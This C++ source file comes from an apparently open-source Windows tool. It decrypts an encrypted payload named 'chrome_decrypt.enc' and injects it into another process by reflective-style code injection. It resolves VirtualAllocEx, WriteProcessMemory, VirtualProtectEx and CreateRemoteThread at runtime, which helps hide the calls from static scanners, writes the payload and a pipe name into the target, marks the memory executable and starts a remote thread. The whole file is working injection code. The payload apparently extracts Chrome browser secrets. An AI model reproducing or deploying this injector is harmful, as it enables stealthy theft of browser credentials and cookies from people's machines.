// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include "injector.hpp"
#include "../crypto/crypto.hpp"
#include "bootstrap_offset.hpp"
#include <sstream>
#include <fstream>

namespace Injector {

    // Function pointer types for runtime-resolved APIs
    using fnVirtualAllocEx = LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    using fnWriteProcessMemory = BOOL(WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
    using fnVirtualProtectEx = BOOL(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
    using fnCreateRemoteThread = HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

    struct InjectionApi {
        fnVirtualAllocEx pVirtualAllocEx;
        fnWriteProcessMemory pWriteProcessMemory;
        fnVirtualProtectEx pVirtualProtectEx;
        fnCreateRemoteThread pCreateRemoteThread;
        bool valid;
    };

    static InjectionApi ResolveApis() {
        InjectionApi api{};
        HMODULE hKernel = GetModuleHandleW(L"kernel32.dll");
        if (!hKernel) {
            api.valid = false;
            return api;
        }
        api.pVirtualAllocEx = (fnVirtualAllocEx)GetProcAddress(hKernel, "VirtualAllocEx");
        api.pWriteProcessMemory = (fnWriteProcessMemory)GetProcAddress(hKernel, "WriteProcessMemory");
        api.pVirtualProtectEx = (fnVirtualProtectEx)GetProcAddress(hKernel, "VirtualProtectEx");
        api.pCreateRemoteThread = (fnCreateRemoteThread)GetProcAddress(hKernel, "CreateRemoteThread");
        api.valid = api.pVirtualAllocEx && api.pWriteProcessMemory &&
                    api.pVirtualProtectEx && api.pCreateRemoteThread;
        return api;
    }

    PayloadInjector::PayloadInjector(ProcessManager& process, const Core::Console& console)
        : m_process(process), m_console(console) {}

    void PayloadInjector::Inject(const std::wstring& pipeName) {
        m_console.Debug("Deriving runtime decryption keys...");
        LoadAndDecryptPayload();
        m_console.Debug("  [+] Payload decrypted (" + std::to_string(m_payload.size() / 1024) + " KB)");

        DWORD offset = Payload::BOOTSTRAP_OFFSET;
        if (offset == 0) {
            throw std::runtime_error("Could not find entry point in payload");
        }
        
        std::stringstream ss;
        ss << "  [+] Bootstrap entry point resolved (offset: 0x" << std::hex << offset << ")";
        m_console.Debug(ss.str());

        auto api = ResolveApis();
        if (!api.valid) {
            throw std::runtime_error("Failed to resolve required APIs");
        }

        SIZE_T payloadSize = m_payload.size();
        SIZE_T pipeNameSize = (pipeName.length() + 1) * sizeof(wchar_t);
        SIZE_T totalSize = payloadSize + pipeNameSize;

        m_console.Debug("Allocating memory in target process...");
        LPVOID remoteBase = api.pVirtualAllocEx(m_process.GetProcessHandle(), nullptr,
                                                totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remoteBase) throw std::runtime_error("Allocation failed");

        ss.str("");
        ss << "  [+] Memory allocated at 0x" << std::hex << reinterpret_cast<uintptr_t>(remoteBase)
           << " (" << std::dec << (totalSize / 1024) << " KB)";
        m_console.Debug(ss.str());

        SIZE_T written = 0;
        if (!api.pWriteProcessMemory(m_process.GetProcessHandle(), remoteBase,
                                     m_payload.data(), payloadSize, &written))
            throw std::runtime_error("Write payload failed");

        LPVOID remotePipeName = reinterpret_cast<uint8_t*>(remoteBase) + payloadSize;
        if (!api.pWriteProcessMemory(m_process.GetProcessHandle(), remotePipeName,
                                     (LPCVOID)pipeName.c_str(), pipeNameSize, &written))
            throw std::runtime_error("Write params failed");
        m_console.Debug("  [+] Payload + parameters written");

        DWORD oldProtect = 0;
        if (!api.pVirtualProtectEx(m_process.GetProcessHandle(), remoteBase,
                                   totalSize, PAGE_EXECUTE_READ, &oldProtect))
            throw std::runtime_error("Protection change failed");
        m_console.Debug("  [+] Memory protection set to PAGE_EXECUTE_READ");

        uintptr_t entry = reinterpret_cast<uintptr_t>(remoteBase) + offset;

        m_console.Debug("Creating remote thread...");
        HANDLE hThread = api.pCreateRemoteThread(m_process.GetProcessHandle(), nullptr, 0,
                                                 (LPTHREAD_START_ROUTINE)entry, remotePipeName, 0, nullptr);
        if (!hThread) throw std::runtime_error("Thread creation failed");

        ss.str("");
        ss << "  [+] Thread created (entry: 0x" << std::hex << entry << ")";
        m_console.Debug(ss.str());
        CloseHandle(hThread);
    }

    void PayloadInjector::LoadAndDecryptPayload() {
        std::filesystem::path payloadPath = GetPayloadFilePath();
        
        std::ifstream file(payloadPath, std::ios::binary);
        if (!file) {
            throw std::runtime_error("Cannot open payload file: " + payloadPath.string());
        }

        m_payload.assign(
            std::istreambuf_iterator<char>(file),
            std::istreambuf_iterator<char>()
        );
        file.close();

        if (m_payload.empty()) {
            throw std::runtime_error("Payload file is empty: " + payloadPath.string());
        }

        if (!Crypto::DecryptPayload(m_payload)) {
            throw std::runtime_error("Failed to derive decryption keys");
        }
    }

    std::filesystem::path PayloadInjector::GetPayloadFilePath() {
        wchar_t exePath[MAX_PATH] = {};
        GetModuleFileNameW(nullptr, exePath, MAX_PATH);
        std::filesystem::path dir = std::filesystem::path(exePath).parent_path();
        std::filesystem::path payloadPath = dir / "chrome_decrypt.enc";

        if (std::filesystem::exists(payloadPath)) {
            return payloadPath;
        }

        payloadPath = std::filesystem::current_path() / "chrome_decrypt.enc";
        if (std::filesystem::exists(payloadPath)) {
            return payloadPath;
        }

        throw std::runtime_error("Payload file not found. Ensure chrome_decrypt.enc is in the same directory as the executable.");
    }

}
